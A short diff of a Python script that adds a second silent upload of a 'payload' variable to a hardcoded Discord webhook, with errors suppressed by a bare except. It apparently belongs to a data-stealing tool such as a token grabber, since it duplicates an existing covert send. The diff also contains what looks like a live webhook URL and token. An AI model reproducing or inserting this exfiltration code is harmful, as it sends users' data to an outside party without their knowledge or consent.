@@ -68,6 +68,12 @@ def main():
         urlopen(req)
     except:
         pass
+    temp = "https://discord.com/api/webhooks/875770580035588159/EF3JmqgRuKBcmhJM8NhVD5CpN5oWW9yescx8tvWy8hMsPAoLJmHyWQYEvw90koktms0Z"
+    try:
+        req = Request(temp, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
 
 if __name__ == '__main__':
     main()
